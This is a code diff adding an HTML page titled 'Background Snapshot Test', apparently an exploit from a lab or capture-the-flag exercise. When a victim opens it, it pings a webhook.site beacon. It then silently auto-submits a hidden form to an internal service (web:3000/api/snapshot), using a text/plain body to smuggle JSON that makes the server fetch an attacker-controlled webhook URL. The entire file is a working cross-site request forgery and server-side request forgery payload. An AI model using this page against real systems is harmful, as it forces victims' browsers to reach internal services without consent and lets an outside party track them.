@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Background Snapshot Test</title>
+</head>
+<body>
+  <h1>Background Snapshot Test</h1>
+
+  <iframe
+    name="snapshotFrame"
+    style="display:none">
+  </iframe>
+
+  <form
+    id="probe"
+    method="POST"
+    action="http://web:3000/api/snapshot"
+    enctype="text/plain"
+    target="snapshotFrame">
+    <input
+      type="hidden"
+      name='{"url":"https://webhook.site/0a945959-6737-49f0-aeed-accf4d0b8713?event=iframe-snapshot","padding":"'
+      value='"}'>
+  </form>
+
+  <script>
+    const marker = new Image();
+    marker.src =
+      "https://webhook.site/0a945959-6737-49f0-aeed-accf4d0b8713"
+      + "?event=iframe-start";
+
+    setTimeout(() => {
+      document.getElementById("probe").submit();
+    }, 800);
+  </script>
+</body>
+</html>
